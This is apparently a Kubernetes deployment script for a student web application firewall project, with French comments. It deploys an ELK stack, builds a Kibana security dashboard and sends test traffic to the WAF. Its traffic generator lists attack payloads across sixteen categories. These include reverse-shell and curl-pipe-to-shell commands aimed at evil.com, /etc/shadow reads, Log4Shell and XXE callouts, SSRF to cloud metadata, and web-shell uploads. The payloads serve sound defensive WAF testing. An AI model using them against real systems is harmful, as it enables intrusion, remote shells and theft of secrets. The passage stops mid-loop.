#!/bin/bash
# =============================================================================
# 🐝 BeeWAF Enterprise v6.0 — Déploiement ELK + Configuration Kibana + Tests
#
# Ce script fait TOUT :
#   1. Déploie la stack ELK (ES, Logstash, Kibana, Filebeat)
#   2. Attend que tout soit prêt
#   3. Configure le Data View Kibana + Dashboard complet
#   4. Génère du trafic de test (attaques + légitime)
#   5. Affiche le résumé et les URLs d'accès
#
# Usage: bash k8s/deploy-elk.sh
# Exécuter depuis la racine du projet sur testhamaster1
# =============================================================================

set -euo pipefail

# ── Couleurs ──
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

NAMESPACE="beewaf"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"

echo -e "${BOLD}${CYAN}"
echo "╔═══════════════════════════════════════════════════════════════╗"
echo "║  🐝 BeeWAF Enterprise v6.0 — Déploiement ELK Complet       ║"
echo "║  Cluster: DPC Tunisia — testhamaster1                        ║"
echo "╚═══════════════════════════════════════════════════════════════╝"
echo -e "${NC}"

# ─────────────────────────────────────────────────────────────────────────────
# Étape 0 : Vérifications préalables
# ─────────────────────────────────────────────────────────────────────────────
echo -e "${YELLOW}[0/6] Vérifications préalables...${NC}"

if ! command -v kubectl &> /dev/null; then
    echo -e "${RED}❌ kubectl non trouvé. Ce script doit être exécuté sur un nœud K8s.${NC}"
    exit 1
fi

# Vérifier le namespace
if ! kubectl get namespace "$NAMESPACE" &> /dev/null; then
    echo -e "  ℹ️  Création du namespace $NAMESPACE..."
    kubectl create namespace "$NAMESPACE"
fi

# Vérifier que BeeWAF est running
BEEWAF_STATUS=$(kubectl get pods -n "$NAMESPACE" -l app=beewaf --no-headers 2>/dev/null | awk '{print $3}' | head -1)
if [ "$BEEWAF_STATUS" != "Running" ]; then
    echo -e "${RED}⚠️  BeeWAF n'est pas Running (status: ${BEEWAF_STATUS:-not found}).${NC}"
    echo -e "${YELLOW}  Déployez d'abord BeeWAF: kubectl apply -f k8s/deployment.yaml${NC}"
    read -p "  Continuer quand même ? (y/N) " -n 1 -r
    echo
    [[ ! $REPLY =~ ^[Yy]$ ]] && exit 1
fi

echo -e "${GREEN}  ✅ Namespace OK, BeeWAF Running${NC}"

# ─────────────────────────────────────────────────────────────────────────────
# Étape 1 : Déployer la stack ELK
# ─────────────────────────────────────────────────────────────────────────────
echo -e "\n${YELLOW}[1/6] Déploiement de la stack ELK...${NC}"
echo -e "  📦 Elasticsearch + Logstash + Kibana + Filebeat"

kubectl apply -f "$SCRIPT_DIR/elk-stack.yaml"

echo -e "${GREEN}  ✅ Manifestes ELK appliqués${NC}"
echo -e "  ⏳ Les images sont en cours de téléchargement (cela peut prendre plusieurs minutes)..."

# ─────────────────────────────────────────────────────────────────────────────
# Étape 2 : Attendre Elasticsearch
# ─────────────────────────────────────────────────────────────────────────────
echo -e "\n${YELLOW}[2/6] Attente Elasticsearch (timeout 10min)...${NC}"
echo -e "  📊 Image: docker.elastic.co/elasticsearch/elasticsearch:8.11.0"

MAX_WAIT=600
ELAPSED=0
while [ $ELAPSED -lt $MAX_WAIT ]; do
    STATUS=$(kubectl get pods -n "$NAMESPACE" -l app=elasticsearch --no-headers 2>/dev/null | awk '{print $3}' | head -1)
    READY=$(kubectl get pods -n "$NAMESPACE" -l app=elasticsearch --no-headers 2>/dev/null | awk '{print $2}' | head -1)
    
    if [ "$READY" = "1/1" ] && [ "$STATUS" = "Running" ]; then
        echo -e "\n${GREEN}  ✅ Elasticsearch prêt ! (${ELAPSED}s)${NC}"
        break
    fi
    
    if [ "$STATUS" = "ImagePullBackOff" ] || [ "$STATUS" = "ErrImagePull" ]; then
        echo -e "\n${RED}  ❌ Erreur de téléchargement image ES !${NC}"
        echo -e "  💡 Solution: Importer l'image manuellement:"
        echo -e "    Sur Kali: docker pull docker.elastic.co/elasticsearch/elasticsearch:8.11.0"
        echo -e "    Sur Kali: docker save elasticsearch:8.11.0 | gzip > es.tar.gz"
        echo -e "    Transférer via SCP, puis sur master1:"
        echo -e "    ctr -n k8s.io images import es.tar.gz"
        echo -e "  Puis relancer: bash k8s/deploy-elk.sh"
        exit 1
    fi
    
    printf "\r  ⏳ Status: %-20s Ready: %-10s [%ds/%ds]" "${STATUS:-Pending}" "${READY:-0/1}" "$ELAPSED" "$MAX_WAIT"
    sleep 10
    ELAPSED=$((ELAPSED + 10))
done

if [ $ELAPSED -ge $MAX_WAIT ]; then
    echo -e "\n${RED}  ❌ Timeout Elasticsearch. Vérifiez: kubectl describe pod -l app=elasticsearch -n $NAMESPACE${NC}"
    exit 1
fi

# ─────────────────────────────────────────────────────────────────────────────
# Étape 3 : Attendre Logstash + Kibana + Filebeat
# ─────────────────────────────────────────────────────────────────────────────
echo -e "\n${YELLOW}[3/6] Attente Logstash + Kibana + Filebeat...${NC}"

for APP in logstash kibana filebeat; do
    echo -ne "  ⏳ $APP..."
    TIMEOUT=300
    EL=0
    while [ $EL -lt $TIMEOUT ]; do
        STATUS=$(kubectl get pods -n "$NAMESPACE" -l app=$APP --no-headers 2>/dev/null | awk '{print $3}' | head -1)
        READY=$(kubectl get pods -n "$NAMESPACE" -l app=$APP --no-headers 2>/dev/null | awk '{print $2}' | head -1)
        
        if [ "$READY" = "1/1" ] && [ "$STATUS" = "Running" ]; then
            echo -e " ${GREEN}✅ (${EL}s)${NC}"
            break
        fi
        
        if [ "$STATUS" = "ImagePullBackOff" ] || [ "$STATUS" = "ErrImagePull" ]; then
            echo -e " ${RED}❌ ImagePullBackOff${NC}"
            echo -e "    💡 Importez l'image manuellement (voir instructions ES ci-dessus)"
            exit 1
        fi
        
        sleep 10
        EL=$((EL + 10))
    done
    
    if [ $EL -ge $TIMEOUT ]; then
        echo -e " ${RED}❌ Timeout${NC}"
        echo -e "    kubectl describe pod -l app=$APP -n $NAMESPACE"
    fi
done

echo ""
echo -e "${GREEN}  ✅ Stack ELK complète !${NC}"
kubectl get pods -n "$NAMESPACE" -o wide

# ─────────────────────────────────────────────────────────────────────────────
# Étape 4 : Configuration du Dashboard Kibana
# ─────────────────────────────────────────────────────────────────────────────
echo -e "\n${YELLOW}[4/6] Configuration du Dashboard Kibana...${NC}"
echo -e "  🎨 Création du Data View + 12 Visualisations + Dashboard"

# Attendre que Kibana soit vraiment accessible
echo -ne "  ⏳ Attente API Kibana..."
for i in $(seq 1 30); do
    if kubectl exec -n "$NAMESPACE" deploy/beewaf -- \
        python3 -c "import urllib.request; urllib.request.urlopen('http://kibana.beewaf.svc.cluster.local:5601/api/status', timeout=5)" \
        2>/dev/null; then
        echo -e " ${GREEN}✅${NC}"
        break
    fi
    sleep 10
done

# Exécuter le setup via Python dans le pod BeeWAF
kubectl exec -n "$NAMESPACE" deploy/beewaf -- python3 << 'DASHBOARD_SETUP'
import urllib.request
import json
import time
import sys

KIBANA = "http://kibana.beewaf.svc.cluster.local:5601"
HEADERS = {"kbn-xsrf": "true", "Content-Type": "application/json"}
DATA_VIEW_ID = "beewaf-logs-dv"

def api(method, path, data=None):
    body = json.dumps(data).encode() if data else None
    req = urllib.request.Request(KIBANA + path, data=body, headers=HEADERS, method=method)
    try:
        resp = urllib.request.urlopen(req, timeout=30)
        return json.loads(resp.read())
    except urllib.error.HTTPError as e:
        err = e.read().decode() if hasattr(e, 'read') else str(e)
        if e.code == 409:
            return {"status": "exists"}
        print(f"  ⚠️  {method} {path} → {e.code}: {err[:200]}")
        return None
    except Exception as e:
        print(f"  ❌ {method} {path} → {e}")
        return None

# ── 1. Créer le Data View ──
print("  📊 Création Data View beewaf-logs-*...")
dv = api("POST", "/api/data_views/data_view", {
    "data_view": {
        "id": DATA_VIEW_ID,
        "title": "beewaf-logs-*",
        "timeFieldName": "@timestamp",
        "name": "BeeWAF Security Logs"
    }
})
if dv:
    print("  ✅ Data View créé")

# ── 2. Créer les Visualisations ──
print("  🎨 Création des visualisations...")

VISUALIZATIONS = [
    {
        "id": "beewaf-attack-types-pie",
        "title": "🔴 Types d'Attaques",
        "visState": json.dumps({
            "title": "Types d'Attaques",
            "type": "pie",
            "aggs": [
                {"id": "1", "enabled": True, "type": "count", "params": {}, "schema": "metric"},
                {"id": "2", "enabled": True, "type": "terms", "params": {"field": "attack_type", "size": 20, "order": "desc", "orderBy": "1"}, "schema": "segment"}
            ],
            "params": {"type": "pie", "addTooltip": True, "addLegend": True, "legendPosition": "right", "isDonut": True}
        })
    },
    {
        "id": "beewaf-blocked-vs-allowed",
        "title": "🛡️ Bloqué vs Autorisé",
        "visState": json.dumps({
            "title": "Bloqué vs Autorisé",
            "type": "histogram",
            "aggs": [
                {"id": "1", "enabled": True, "type": "count", "params": {}, "schema": "metric"},
                {"id": "2", "enabled": True, "type": "date_histogram", "params": {"field": "@timestamp", "interval": "auto", "min_doc_count": 1}, "schema": "segment"},
                {"id": "3", "enabled": True, "type": "terms", "params": {"field": "blocked", "size": 2, "order": "desc", "orderBy": "1"}, "schema": "group"}
            ],
            "params": {"type": "histogram", "addTooltip": True, "addLegend": True, "legendPosition": "top"}
        })
    },
    {
        "id": "beewaf-top-blocked-paths",
        "title": "🎯 Top Chemins Bloqués",
        "visState": json.dumps({
            "title": "Top Chemins Bloqués",
            "type": "horizontal_bar",
            "aggs": [
                {"id": "1", "enabled": True, "type": "count", "params": {}, "schema": "metric"},
                {"id": "2", "enabled": True, "type": "terms", "params": {"field": "http_path.keyword", "size": 15, "order": "desc", "orderBy": "1"}, "schema": "segment"}
            ],
            "params": {"type": "horizontal_bar", "addTooltip": True, "addLegend": False}
        })
    },
    {
        "id": "beewaf-total-requests",
        "title": "📊 Total Requêtes",
        "visState": json.dumps({
            "title": "Total Requêtes",
            "type": "metric",
            "aggs": [{"id": "1", "enabled": True, "type": "count", "params": {}, "schema": "metric"}],
            "params": {"addTooltip": True, "addLegend": False, "type": "metric", "metric": {"style": {"fontSize": 60, "bgFill": "#000", "labelColor": False, "subText": "Total Requests"}}}
        })
    },
    {
        "id": "beewaf-total-blocked",
        "title": "🚫 Total Bloqué",
        "visState": json.dumps({
            "title": "Total Bloqué",
            "type": "metric",
            "aggs": [{"id": "1", "enabled": True, "type": "count", "params": {}, "schema": "metric"}],
            "params": {"addTooltip": True, "addLegend": False, "type": "metric", "metric": {"style": {"fontSize": 60, "bgFill": "#E74C3C", "labelColor": False, "subText": "Blocked Attacks"}}}
        }),
        "filter": {"query": "blocked:true", "language": "lucene"}
    },
    {
        "id": "beewaf-top-attacker-ips",
        "title": "🏴‍☠️ Top IPs Attaquantes",
        "visState": json.dumps({
            "title": "Top IPs Attaquantes",
            "type": "table",
            "aggs": [
                {"id": "1", "enabled": True, "type": "count", "params": {}, "schema": "metric"},
                {"id": "2", "enabled": True, "type": "terms", "params": {"field": "client_ip", "size": 20, "order": "desc", "orderBy": "1"}, "schema": "bucket"}
            ],
            "params": {"perPage": 10, "showTotal": True, "totalFunc": "sum"}
        }),
        "filter": {"query": "blocked:true", "language": "lucene"}
    },
    {
        "id": "beewaf-tags-cloud",
        "title": "☁️ Tags Sécurité",
        "visState": json.dumps({
            "title": "Tags Sécurité",
            "type": "tagcloud",
            "aggs": [
                {"id": "1", "enabled": True, "type": "count", "params": {}, "schema": "metric"},
                {"id": "2", "enabled": True, "type": "terms", "params": {"field": "tags", "size": 30, "order": "desc", "orderBy": "1"}, "schema": "segment"}
            ],
            "params": {"scale": "linear", "orientation": "single", "minFontSize": 14, "maxFontSize": 72}
        })
    },
    {
        "id": "beewaf-http-methods",
        "title": "📡 Méthodes HTTP",
        "visState": json.dumps({
            "title": "Méthodes HTTP",
            "type": "pie",
            "aggs": [
                {"id": "1", "enabled": True, "type": "count", "params": {}, "schema": "metric"},
                {"id": "2", "enabled": True, "type": "terms", "params": {"field": "http_method", "size": 10, "order": "desc", "orderBy": "1"}, "schema": "segment"}
            ],
            "params": {"type": "pie", "addTooltip": True, "addLegend": True, "legendPosition": "right", "isDonut": False}
        })
    },
    {
        "id": "beewaf-request-timeline",
        "title": "📈 Timeline Requêtes",
        "visState": json.dumps({
            "title": "Timeline Requêtes",
            "type": "line",
            "aggs": [
                {"id": "1", "enabled": True, "type": "count", "params": {}, "schema": "metric"},
                {"id": "2", "enabled": True, "type": "date_histogram", "params": {"field": "@timestamp", "interval": "auto", "min_doc_count": 0}, "schema": "segment"},
                {"id": "3", "enabled": True, "type": "filters", "params": {"filters": [
                    {"input": {"query": "blocked:true"}, "label": "Bloqué"},
                    {"input": {"query": "blocked:false"}, "label": "Autorisé"}
                ]}, "schema": "group"}
            ],
            "params": {"type": "line", "addTooltip": True, "addLegend": True, "legendPosition": "top", "showCircles": True}
        })
    },
    {
        "id": "beewaf-status-codes",
        "title": "🔢 Codes HTTP",
        "visState": json.dumps({
            "title": "Codes HTTP",
            "type": "pie",
            "aggs": [
                {"id": "1", "enabled": True, "type": "count", "params": {}, "schema": "metric"},
                {"id": "2", "enabled": True, "type": "terms", "params": {"field": "status_code", "size": 10, "order": "desc", "orderBy": "1"}, "schema": "segment"}
            ],
            "params": {"type": "pie", "addTooltip": True, "addLegend": True, "legendPosition": "right", "isDonut": True}
        })
    },
    {
        "id": "beewaf-avg-latency",
        "title": "⏱️ Latence Moyenne (ms)",
        "visState": json.dumps({
            "title": "Latence Moyenne (ms)",
            "type": "metric",
            "aggs": [{"id": "1", "enabled": True, "type": "avg", "params": {"field": "latency_ms"}, "schema": "metric"}],
            "params": {"addTooltip": True, "addLegend": False, "type": "metric", "metric": {"style": {"fontSize": 60}}}
        })
    },
    {
        "id": "beewaf-severity-pie",
        "title": "⚡ Sévérité des Attaques",
        "visState": json.dumps({
            "title": "Sévérité des Attaques",
            "type": "pie",
            "aggs": [
                {"id": "1", "enabled": True, "type": "count", "params": {}, "schema": "metric"},
                {"id": "2", "enabled": True, "type": "terms", "params": {"field": "severity", "size": 5, "order": "desc", "orderBy": "1"}, "schema": "segment"}
            ],
            "params": {"type": "pie", "addTooltip": True, "addLegend": True, "legendPosition": "right", "isDonut": False}
        }),
        "filter": {"query": "blocked:true", "language": "lucene"}
    },
    {
        "id": "beewaf-recent-attacks-table",
        "title": "🚨 Dernières Attaques",
        "visState": json.dumps({
            "title": "Dernières Attaques",
            "type": "table",
            "aggs": [
                {"id": "1", "enabled": True, "type": "count", "params": {}, "schema": "metric"},
                {"id": "2", "enabled": True, "type": "terms", "params": {"field": "client_ip", "size": 50, "order": "desc", "orderBy": "1"}, "schema": "bucket"},
                {"id": "3", "enabled": True, "type": "terms", "params": {"field": "attack_type", "size": 5, "order": "desc", "orderBy": "1"}, "schema": "bucket"},
                {"id": "4", "enabled": True, "type": "terms", "params": {"field": "http_path.keyword", "size": 3, "order": "desc", "orderBy": "1"}, "schema": "bucket"},
                {"id": "5", "enabled": True, "type": "terms", "params": {"field": "severity", "size": 3, "order": "desc", "orderBy": "1"}, "schema": "bucket"}
            ],
            "params": {"perPage": 15, "showTotal": True, "totalFunc": "sum"}
        }),
        "filter": {"query": "blocked:true", "language": "lucene"}
    },
    {
        "id": "beewaf-info-markdown",
        "title": "🐝 BeeWAF Info",
        "visState": json.dumps({
            "title": "BeeWAF Enterprise v6.0",
            "type": "markdown",
            "params": {"markdown": "# 🐝 BeeWAF Enterprise v6.0\n\n**WAF Intelligent avec ML + Deep Analytics**\n\n---\n\n- ✅ **10,041** Règles Regex\n- 🤖 **3 Modèles ML** (IF + RF + GB)\n- 🛡️ **27 Modules** Sécurité\n- 📋 **7 Frameworks** Conformité\n- 🌍 **GeoIP** Filtrage\n- 🤖 **Bot Detection** Avancé\n- ⚡ **Rate Limiting** Adaptatif\n- 🔍 **API Security** (BOLA/IDOR)\n- 🧠 **Zero-Day** Heuristique\n- 📊 **OWASP Top 10** Coverage\n\n---\n\n*Projet PFE — DPC Tunisia*\n*Déployé sur K8s Cluster*"},
            "aggs": []
        })
    }
]

for vis in VISUALIZATIONS:
    search_source = {"index": DATA_VIEW_ID, "query": {"query": "", "language": "kuery"}, "filter": []}
    if "filter" in vis:
        search_source["query"] = vis["filter"]

    body = {
        "attributes": {
            "title": vis["title"],
            "visState": vis["visState"],
            "uiStateJSON": "{}",
            "description": "",
            "kibanaSavedObjectMeta": {
                "searchSourceJSON": json.dumps(search_source)
            }
        },
        "references": [
            {
                "id": DATA_VIEW_ID,
                "name": "kibanaSavedObjectMeta.searchSourceJSON.index",
                "type": "index-pattern"
            }
        ]
    }
    
    result = api("POST", f"/api/saved_objects/visualization/{vis['id']}", body)
    status = "✅" if result else "❌"
    print(f"  {status} {vis['title']}")

# ── 3. Créer le Dashboard ──
print("  📋 Création du Dashboard principal...")

# Arrangement des panels en grille 48 colonnes (Kibana 8.x)
panels = []
# Rangée 1 : Info + Metrics (y=0, h=12)
layout = [
    {"id": "beewaf-info-markdown",       "x": 0,  "y": 0,  "w": 12, "h": 12},
    {"id": "beewaf-total-requests",      "x": 12, "y": 0,  "w": 9,  "h": 6},
    {"id": "beewaf-total-blocked",       "x": 21, "y": 0,  "w": 9,  "h": 6},
    {"id": "beewaf-avg-latency",         "x": 30, "y": 0,  "w": 9,  "h": 6},
    {"id": "beewaf-severity-pie",        "x": 39, "y": 0,  "w": 9,  "h": 6},
    {"id": "beewaf-attack-types-pie",    "x": 12, "y": 6,  "w": 18, "h": 12},
    {"id": "beewaf-status-codes",        "x": 30, "y": 6,  "w": 9,  "h": 6},
    {"id": "beewaf-http-methods",        "x": 39, "y": 6,  "w": 9,  "h": 6},
    # Rangée 2 : Charts (y=12)
    {"id": "beewaf-blocked-vs-allowed",  "x": 0,  "y": 12, "w": 24, "h": 12},
    {"id": "beewaf-request-timeline",    "x": 24, "y": 12, "w": 24, "h": 12},
    # Rangée 3 : Tables + Nuage (y=24)
    {"id": "beewaf-top-attacker-ips",    "x": 0,  "y": 24, "w": 16, "h": 12},
    {"id": "beewaf-top-blocked-paths",   "x": 16, "y": 24, "w": 16, "h": 12},
    {"id": "beewaf-tags-cloud",          "x": 32, "y": 24, "w": 16, "h": 12},
    # Rangée 4 : Table détaillée (y=36)
    {"id": "beewaf-recent-attacks-table", "x": 0, "y": 36, "w": 48, "h": 14},
]

references = []
for i, p in enumerate(layout):
    panels.append({
        "version": "8.11.0",
        "type": "visualization",
        "gridData": {"x": p["x"], "y": p["y"], "w": p["w"], "h": p["h"], "i": str(i)},
        "panelIndex": str(i),
        "embeddableConfig": {},
        "panelRefName": f"panel_{i}"
    })
    references.append({
        "id": p["id"],
        "name": f"panel_{i}",
        "type": "visualization"
    })

dashboard_body = {
    "attributes": {
        "title": "🐝 BeeWAF Enterprise — Security Dashboard",
        "description": "Dashboard complet de supervision sécurité BeeWAF v6.0 — Total requêtes, attaques bloquées, IPs, types d'attaques, sévérité, timeline, et plus.",
        "panelsJSON": json.dumps(panels),
        "optionsJSON": json.dumps({"useMargins": True, "syncColors": True, "syncCursor": True, "syncTooltips": False, "hidePanelTitles": False}),
        "timeRestore": True,
        "timeTo": "now",
        "timeFrom": "now-24h",
        "refreshInterval": {"pause": False, "value": 30000},
        "kibanaSavedObjectMeta": {
            "searchSourceJSON": json.dumps({"query": {"query": "", "language": "kuery"}, "filter": []})
        }
    },
    "references": references
}

result = api("POST", "/api/saved_objects/dashboard/beewaf-security-dashboard", dashboard_body)
if result:
    print("  ✅ Dashboard créé avec succès !")
else:
    print("  ⚠️  Dashboard déjà existant ou erreur (voir ci-dessus)")

print("\n  🎉 Configuration Kibana terminée !")
DASHBOARD_SETUP

echo -e "${GREEN}  ✅ Dashboard Kibana configuré${NC}"

# ─────────────────────────────────────────────────────────────────────────────
# Étape 5 : Génération du trafic de test
# ─────────────────────────────────────────────────────────────────────────────
echo -e "\n${YELLOW}[5/6] Génération du trafic de test (attaques + légitime)...${NC}"
echo -e "  🎯 16 catégories d'attaques + requêtes légitimes"

kubectl exec -n "$NAMESPACE" deploy/beewaf -- python3 << 'TRAFFIC_GEN'
import urllib.request
import urllib.error
import urllib.parse
import json
import time
import random

BASE = "http://localhost:8000"
stats = {"total": 0, "blocked": 0, "passed": 0, "errors": 0, "attacks_by_type": {}}

def send(method, path, body=None, headers=None, attack_type="unknown"):
    """Envoyer une requête au WAF"""
    url = BASE + path
    data = body.encode("utf-8") if body else None
    h = headers or {}
    # Simuler des IPs différentes
    h["X-Forwarded-For"] = f"{random.randint(10,250)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    if "User-Agent" not in h:
        h["User-Agent"] = random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15",
        ])
    
    req = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        stats["total"] += 1
        stats["passed"] += 1
        return resp.status
    except urllib.error.HTTPError as e:
        stats["total"] += 1
        if e.code == 403:
            stats["blocked"] += 1
            stats["attacks_by_type"][attack_type] = stats["attacks_by_type"].get(attack_type, 0) + 1
        return e.code
    except Exception as e:
        stats["errors"] += 1
        return 0

# ═══════════════════════════════════════════════════════════════
# ATTAQUES — 16 catégories complètes
# ═══════════════════════════════════════════════════════════════

print("  🔥 Envoi des attaques...")

# 1. SQL Injection (SQLi)
print("    [1/16] SQL Injection...")
sqli_payloads = [
    "/?id=1' OR '1'='1", "/?id=1; DROP TABLE users--", "/?q=admin'--",
    "/?search=1' UNION SELECT username,password FROM users--",
    "/?id=1 AND 1=CONVERT(int,(SELECT @@version))--",
    "/?id=1' AND SLEEP(5)--", "/?id=-1' UNION ALL SELECT NULL,table_name FROM information_schema.tables--",
    "/?user=1'; EXEC xp_cmdshell('whoami')--", "/?id=1' OR 1=1 LIMIT 1--",
    "/?id=1' AND (SELECT COUNT(*) FROM sysobjects)>0--"
]
for p in sqli_payloads:
    send("GET", p, attack_type="SQL Injection")
    time.sleep(0.1)

# 2. Cross-Site Scripting (XSS)
print("    [2/16] XSS...")
xss_payloads = [
    "/?q=<script>alert('XSS')</script>", "/?q=<img src=x onerror=alert(1)>",
    "/?q=<svg/onload=alert('XSS')>", "/?q=javascript:alert(document.cookie)",
    "/?q=<body onload=alert(1)>", "/?q=%3Cscript%3Ealert(1)%3C/script%3E",
    "/?q=<iframe src='javascript:alert(1)'>", "/?q=<input onfocus=alert(1) autofocus>",
    "/?q=<details/open/ontoggle=alert(1)>", "/?q=\"><script>alert(String.fromCharCode(88,83,83))</script>"
]
for p in xss_payloads:
    send("GET", p, attack_type="XSS")
    time.sleep(0.1)

# 3. Command Injection
print("    [3/16] Command Injection...")
cmdi_payloads = [
    "/?cmd=;cat /etc/passwd", "/?cmd=|ls -la", "/?file=test;whoami",
    "/?cmd=$(id)", "/?input=`cat /etc/shadow`", "/?cmd=;nc -e /bin/sh 10.0.0.1 4444",
    "/?cmd=|ping -c 4 evil.com", "/?dir=;curl http://evil.com/shell.sh|sh"
]
for p in cmdi_payloads:
    send("GET", p, attack_type="Command Injection")
    time.sleep(0.1)

# 4. Path Traversal / LFI
print("    [4/16] Path Traversal / LFI...")
lfi_payloads = [
    "/../../etc/passwd", "/..%2f..%2f..%2fetc/passwd",
    "/?file=../../../etc/shadow", "/?page=....//....//....//etc/passwd",
    "/etc/passwd%00", "/?file=/proc/self/environ",
    "/?file=php://filter/convert.base64-encode/resource=config",
    "/?file=file:///etc/hostname"
]
for p in lfi_payloads:
    send("GET", p, attack_type="Path Traversal")
    time.sleep(0.1)

# 5. SSRF
print("    [5/16] SSRF...")
ssrf_payloads = [
    "/?url=http://169.254.169.254/latest/meta-data/", "/?url=http://127.0.0.1:22",
    "/?url=http://localhost:6379/", "/?url=http://[::1]:8080",
    "/?redirect=http://metadata.google.internal/computeMetadata/v1/",
    "/?url=http://0x7f000001:80"
]
for p in ssrf_payloads:
    send("GET", p, attack_type="SSRF")
    time.sleep(0.1)

# 6. XXE
print("    [6/16] XXE...")
xxe_payloads = [
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',),
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/steal">]><foo>&xxe;</foo>',),
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',),
]
for (p,) in xxe_payloads:
    send("POST", "/api/data", body=p, headers={"Content-Type": "application/xml"}, attack_type="XXE")
    time.sleep(0.1)

# 7. SSTI
print("    [7/16] SSTI...")
ssti_payloads = [
    "/?name={{7*7}}", "/?name={{config.items()}}",
    "/?tpl={{''.__class__.__mro__[1].__subclasses__()}}",
    "/?q=${7*7}", "/?q=<%= 7*7 %>"
]
for p in ssti_payloads:
    send("GET", p, attack_type="SSTI")
    time.sleep(0.1)

# 8. Log4Shell
print("    [8/16] Log4Shell...")
log4j_payloads = [
    "/?q=${jndi:ldap://evil.com/a}", "/?q=${jndi:rmi://evil.com/exploit}",
    "/?q=${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://evil.com/x}"
]
for p in log4j_payloads:
    send("GET", p, attack_type="Log4Shell")
    time.sleep(0.1)

# 9. Scanner Probes
print("    [9/16] Scanner Probes...")
scanner_paths = [
    "/.env", "/wp-admin/", "/phpmyadmin/", "/admin/", "/.git/config",
    "/wp-login.php", "/config.php", "/server-status", "/actuator/health",
    "/api/v1/admin"
]
scanner_uas = [
    "sqlmap/1.7.2", "Nikto/2.5.0", "Nmap Scripting Engine",
    "DirBuster-1.0", "gobuster/3.6", "WPScan v3.8"
]
for path in scanner_paths:
    send("GET", path, headers={"User-Agent": random.choice(scanner_uas)}, attack_type="Scanner Probe")
    time.sleep(0.1)

# 10. Deserialization
print("    [10/16] Deserialization...")
deser_payloads = [
    "/?data=rO0ABXNyAA1qYXZhLmxhbmcuSW50ZWdl", # Java deserialization
    "/?data=O:8:\"stdClass\":0:{}", # PHP deserialization
    "/?data=__import__('os').system('id')" # Python pickle
]
for p in deser_payloads:
    send("GET", p, attack_type="Deserialization")
    time.sleep(0.1)

# 11. File Upload attacks
print("    [11/16] File Upload...")
send("POST", "/upload", body="----\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\nContent-Type: application/x-php\r\n\r\n<?php system($_GET['c']); ?>\r\n----", 
     headers={"Content-Type": "multipart/form-data; boundary=--"}, attack_type="File Upload")
send("POST", "/upload", body="----\r\nContent-Disposition: form-data; name=\"file\"; filename=\"backdoor.jsp\"\r\n\r\n<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>\r\n----",
     headers={"Content-Type": "multipart/form-data; boundary=--"}, attack_type="File Upload")
time.sleep(0.1)

# 12. JWT Attacks
print("    [12/16] JWT Attacks...")
send("GET", "/api/user", headers={"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.", "User-Agent": "Mozilla/5.0"}, attack_type="JWT Attack")
time.sleep(0.1)

# 13. CRLF Injection
print("    [13/16] CRLF Injection...")
crlf_payloads = [
    "/?q=test%0d%0aSet-Cookie:admin=true", "/?q=test%0d%0aLocation:http://evil.com"
]
for p in crlf_payloads:
    send("GET", p, attack_type="CRLF Injection")
    time.sleep(0.1)

# 14. NoSQL Injection
print("    [14/16] NoSQL Injection...")
nosql_payloads = [
    '/?q={"$gt":""}', '/?user[$ne]=null&pass[$ne]=null',
]
for p in nosql_payloads:
    send("GET", p, attack_type="NoSQL Injection")
    time.sleep(0.1)
send("POST", "/api/login", body='{"username":{"$gt":""},"password":{"$gt":""}}', 
     headers={"Content-Type": "application/json"}, attack_type="NoSQL Injection")
time.sleep(0.1)

# 15. HTTP Smuggling attempts
print("    [15/16] HTTP Smuggling...")
send("POST", "/", body="0\r\n\r\nGET /admin HTTP/1.1\r\nHost: evil\r\n\r\n", 
     headers={"Transfer-Encoding": "chunked", "Content-Length": "6"}, attack_type="HTTP Smuggling")
time.sleep(0.1)

# 16. Windows-specific attacks
print("    [16/16] Windows/RCE...")
win_payloads = [
    "/?cmd=cmd.exe /c dir", "/?file=C:\\Windows\\system32\\drivers\\etc\\hosts",
    "/?cmd=powershell -enc JABjAGwAaQBlAG4AdA"
]
for p in win_payloads:
    send("GET", p, attack_type="Windows Attack")
    time.sleep(0.1)

# ═══════════════════════════════════════════════════════════════
# REQUÊTES LÉGITIMES
# ═══════════════════════════════════════════════════════════════
print("\n  ✅ Envoi du trafic légitime...")
legitimate_paths = [
    "/", "/about", "/contact", "/products", "/services",
    "/api/v1/status", "/search?q=laptop", "/search?q=phone+case",
    "/user/profile", "/cart", "/checkout", "/help",
    "/blog/2024/security-tips", "/documentation", "/faq",
    "/terms", "/privacy", "/sitemap.xml", "/robots.txt",
    "/api/v1/products?page=1&limit=20"
]
for i in range(3):  # 3 rounds de trafic légitime
    for path in legitimate_paths:
        send("GET", path, attack_type="legitimate")
        time.sleep(0.05)

# ═══════════════════════════════════════════════════════════════
# BURST — Mélange rapide
# ═══════════════════════════════════════════════════════════════
print("\n  💥 Burst mixte (50 requêtes rapides)...")
burst_attacks = [
    "/?id=1' OR 1=1--", "/?q=<script>alert(1)</script>",
    "/?cmd=;id", "/../../etc/passwd", "/?url=http://169.254.169.254/",
    "/${jndi:ldap://evil/a}", "/?tpl={{7*7}}", "/.env",
    "/?q=test%0d%0aEvil:true", "/?data=O:4:\"test\":0:{}"
]
for _ in range(50):
    if random.random() < 0.4:
